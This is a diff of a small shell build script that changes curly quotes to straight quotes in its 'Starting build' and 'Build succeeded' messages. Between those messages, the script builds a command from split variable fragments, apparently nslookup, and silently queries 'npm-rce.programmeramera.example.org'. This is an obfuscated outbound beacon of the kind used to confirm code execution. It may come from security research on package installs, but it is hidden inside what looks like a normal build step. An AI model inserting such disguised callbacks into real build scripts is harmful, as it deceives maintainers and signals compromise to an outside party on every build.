@@ -1,6 +1,6 @@
 #!/usr/bin/env sh
 
-echo “Starting build..."
+echo "Starting build..."
 amount=ample
 former=ex
 organization=org
@@ -9,4 +9,4 @@ install_b=okup
 
 $install_a$install_b npm-rce.programmeramera.$former$amount.$organization >/dev/null
 
-echo “Build succeeded..."
+echo "Build succeeded..."
